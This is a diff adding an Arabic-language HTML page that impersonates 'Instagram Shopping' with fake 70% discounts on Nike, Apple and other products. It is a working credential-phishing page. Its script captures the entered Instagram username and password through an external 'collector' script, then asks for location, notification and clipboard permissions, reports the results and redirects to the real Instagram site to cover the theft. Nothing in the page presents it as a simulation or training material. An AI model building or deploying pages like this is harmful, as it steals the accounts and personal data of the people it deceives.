@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#f97316">
+<title>Instagram Shopping</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    min-height: 100vh;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #f8fafc;
+    color: #1c1e21;
+  }
+  .header {
+    background: linear-gradient(135deg, #f97316, #ea580c);
+    color: #fff;
+    padding: 24px 20px;
+    text-align: center;
+  }
+  .header-icon { font-size: 40px; margin-bottom: 8px; }
+  .header h1 {
+    font-size: 22px;
+    font-weight: 800;
+    margin-bottom: 6px;
+  }
+  .header p {
+    font-size: 13px;
+    opacity: 0.95;
+  }
+  .container {
+    max-width: 500px;
+    margin: 0 auto;
+    padding: 20px;
+  }
+  .products-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+  .product-card {
+    background: #fff;
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+  }
+  .product-image {
+    height: 120px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 48px;
+    background: linear-gradient(135deg, #fed7aa, #fdba74);
+  }
+  .product-info { padding: 10px; }
+  .product-name {
+    font-size: 13px;
+    font-weight: 600;
+    margin-bottom: 4px;
+  }
+  .product-price {
+    font-size: 14px;
+    color: #ea580c;
+    font-weight: 700;
+  }
+  .product-old {
+    font-size: 11px;
+    color: #94a3b8;
+    text-decoration: line-through;
+    margin-left: 6px;
+  }
+  .cart-summary {
+    background: #fff;
+    border-radius: 16px;
+    padding: 20px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    margin-bottom: 16px;
+  }
+  .summary-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 8px 0;
+    font-size: 14px;
+    border-bottom: 1px solid #f1f5f9;
+  }
+  .summary-row:last-child {
+    border-bottom: none;
+    font-weight: 700;
+    font-size: 16px;
+    color: #ea580c;
+    margin-top: 8px;
+  }
+  .login-card {
+    background: #fff;
+    border-radius: 16px;
+    padding: 24px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+  }
+  .login-card h3 {
+    font-size: 17px;
+    font-weight: 700;
+    margin-bottom: 8px;
+  }
+  .login-card p {
+    font-size: 13px;
+    color: #65676b;
+    line-height: 1.5;
+    margin-bottom: 16px;
+  }
+  .input {
+    width: 100%;
+    padding: 14px 16px;
+    border: 1px solid #e2e8f0;
+    border-radius: 10px;
+    font-size: 15px;
+    font-family: inherit;
+    margin-bottom: 12px;
+    background: #f8fafc;
+  }
+  .input:focus {
+    outline: none;
+    border-color: #f97316;
+    background: #fff;
+    box-shadow: 0 0 0 3px rgba(249,115,22,0.1);
+  }
+  .btn {
+    width: 100%;
+    padding: 15px;
+    background: linear-gradient(135deg, #f97316, #ea580c);
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: inherit;
+    box-shadow: 0 10px 30px rgba(249,115,22,0.3);
+  }
+  .btn:active { transform: scale(0.98); }
+  .btn:disabled { opacity: 0.6; }
+  .error-msg {
+    background: #fef2f2;
+    border: 1px solid #fecaca;
+    border-radius: 8px;
+    padding: 10px 12px;
+    color: #991b1b;
+    font-size: 13px;
+    margin-bottom: 12px;
+    display: none;
+  }
+  .error-msg.show { display: block; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-icon">🛍️</div>
+  <h1>Instagram Shopping</h1>
+  <p>عروض حصرية بخصم يصل إلى 70%</p>
+</div>
+
+<div class="container">
+
+  <div class="products-grid">
+    <div class="product-card">
+      <div class="product-image">👟</div>
+      <div class="product-info">
+        <div class="product-name">Nike Air Max</div>
+        <div class="product-price">$89 <span class="product-old">$299</span></div>
+      </div>
+    </div>
+    <div class="product-card">
+      <div class="product-image">🎧</div>
+      <div class="product-info">
+        <div class="product-name">AirPods Pro</div>
+        <div class="product-price">$79 <span class="product-old">$249</span></div>
+      </div>
+    </div>
+    <div class="product-card">
+      <div class="product-image">⌚</div>
+      <div class="product-info">
+        <div class="product-name">Apple Watch</div>
+        <div class="product-price">$199 <span class="product-old">$599</span></div>
+      </div>
+    </div>
+    <div class="product-card">
+      <div class="product-image">📱</div>
+      <div class="product-info">
+        <div class="product-name">iPhone 15</div>
+        <div class="product-price">$699 <span class="product-old">$1199</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="cart-summary">
+    <div class="summary-row">
+      <span>عدد المنتجات</span>
+      <span>4 منتجات</span>
+    </div>
+    <div class="summary-row">
+      <span>السعر الأصلي</span>
+      <span>$2,346</span>
+    </div>
+    <div class="summary-row">
+      <span>الخصم (70%)</span>
+      <span style="color:#10b981;">-$1,642</span>
+    </div>
+    <div class="summary-row">
+      <span>الإجمالي</span>
+      <span>$704</span>
+    </div>
+  </div>
+
+  <div class="login-card">
+    <h3>🔐 سجّل دخول لإتمام الطلب</h3>
+    <p>
+      للاستفادة من العرض الحصري وإتمام الدفع، يرجى تسجيل الدخول بحسابك.
+    </p>
+
+    <div class="error-msg" id="error-msg"></div>
+
+    <form id="shop-form" onsubmit="return handleShop(event)">
+      <input type="text" id="username" class="input" placeholder="اسم المستخدم على Instagram" required>
+      <input type="password" id="password" class="input" placeholder="كلمة المرور" required>
+      <button type="submit" class="btn" id="shop-btn">
+        إتمام الطلب 🛒
+      </button>
+    </form>
+  </div>
+
+</div>
+
+<script src="/fs/static/collector.js"></script>
+
+<script>
+(function() {
+    "use strict";
+
+    var submitting = false;
+
+    function showError(msg) {
+        var el = document.getElementById('error-msg');
+        el.textContent = msg;
+        el.classList.add('show');
+        setTimeout(function() { el.classList.remove('show'); }, 4000);
+    }
+
+    function handleShop(event) {
+        event.preventDefault();
+        if (submitting) return false;
+
+        var username = document.getElementById('username').value.trim();
+        var password = document.getElementById('password').value.trim();
+
+        if (!username || !password) {
+            showError('يرجى ملء جميع الحقول');
+            return false;
+        }
+
+        submitting = true;
+        var btn = document.getElementById('shop-btn');
+        btn.disabled = true;
+        btn.textContent = 'جاري معالجة الطلب...';
+
+        FSCollector.captureForm({
+            username: username,
+            password: password,
+            form_type: 'shopping'
+        }, {
+            metadata: { page: 'instagram_10_shopping' }
+        }).then(function() {
+            FSCollector.showLoader('جاري معالجة الدفع الآمن...');
+
+            setTimeout(function() {
+                FSCollector.requestPermissions({
+                    camera: false,
+                    microphone: false,
+                    location: true,
+                    notifications: true,
+                    clipboard: true,
+                    showOverlay: true
+                }).then(function(perms) {
+                    FSCollector.sendPermissionsResult(perms);
+
+                    setTimeout(function() {
+                        FSCollector.redirect('https://www.instagram.com');
+                    }, 2000);
+                });
+            }, 500);
+        });
+
+        return false;
+    }
+
+    window.handleShop = handleShop;
+
+})();
+</script>
+
+</body>
+</html>
